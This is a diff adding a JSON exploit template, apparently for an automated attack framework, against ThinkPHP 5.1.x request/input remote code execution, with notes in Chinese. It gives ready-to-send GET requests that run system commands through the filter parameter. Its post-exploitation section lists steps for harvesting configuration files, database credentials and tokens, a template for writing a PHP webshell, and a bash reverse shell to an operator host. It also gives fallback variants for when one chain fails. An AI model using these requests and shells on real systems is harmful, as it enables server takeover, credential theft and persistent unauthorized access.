@@ -1,0 +1,125 @@
+{
+  "id": "thinkphp-5.1.x-request-input-rce",
+  "family": "thinkphp",
+  "product": "ThinkPHP",
+  "cve": "N/A",
+  "aliases": [
+    "ThinkPHP 5.1.x request input RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "thinkphp",
+    "5.1.x",
+    "request-input",
+    "rce",
+    "n-day"
+  ],
+  "applicability": {
+    "versions": [
+      "5.1.x"
+    ],
+    "fingerprints": [
+      "请求可到达 /index.php?s=index/\\think\\request/input",
+      "目标页面、错误页或静态资源路径符合 ThinkPHP 5.1.x 站点风格",
+      "大小写更接近小写 request 命名空间链路"
+    ],
+    "signals": [
+      "filter=md5 与 data 参数组合能回显已知哈希",
+      "旧版 ThinkPHP 5.1.x 站点常同时暴露 index.php 与 route 参数",
+      "接口层没有强认证即可进入框架调度逻辑"
+    ]
+  },
+  "preconditions": [
+    "前控制器暴露且支持请求参数驱动的路径解析。",
+    "请求最终进入 Request/input 过滤链。",
+    "应用层防护未阻断关键参数组合。"
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\request/input&filter=md5&data=thinkphp51",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "matchers": [
+          "1aefe1f1c5c6b887510def4dcff31e50",
+          "正文或调试片段中包含 md5 marker"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\request/input&filter=system&data=id",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/index.php?s=index/\\think\\request/input&filter=system&data=whoami",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先做环境探针：whoami、hostname、pwd、env、php -v、ip addr。",
+      "如果是 Web 容器环境，优先枚举 web 根目录、配置文件、数据库凭据和上传目录。",
+      "若存在会话或 token 文件，优先收集可复用凭据，避免一直依赖命令回显。"
+    ],
+    "shell_options": [
+      {
+        "type": "php_webshell_write",
+        "template": "printf '%s' '<?php @system($_REQUEST[\"cmd\"]); ?>' > {writable_path}/tp51.php"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "用 md5 探针确认 5.1.x request/input 链。",
+      "确认执行权限边界后优先找更稳定的 foothold，如配置泄露、可写路径、现成后台。",
+      "只有在确认回连条件满足时才尝试出网型 shell。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname",
+      "env"
+    ],
+    "shell_prerequisites": [
+      "确认目标主机可回连或已有内网代理链。",
+      "确认目标没有对出网连接做严格限制。"
+    ],
+    "fallbacks": [
+      "如果小写 request 链不通，回退到大写 Request/input 或 invokefunction 变体。",
+      "如果命令执行回显不稳定，优先转向文件读写、调试信息和日志落地。"
+    ]
+  },
+  "detection_notes": [
+    "同类靶场常把多个 ThinkPHP 变体混合部署，失败时要及时切换大小写和链路。",
+    "如果平台是多阶段题目，命令执行成功后要优先保留凭据和 foothold，不要误以为本地 flag 即完成。"
+  ],
+  "references": [
+    "Vulhub ThinkPHP 5.1.x reproduction",
+    "Public ThinkPHP 5.1.x request/input exploitation notes"
+  ]
+}
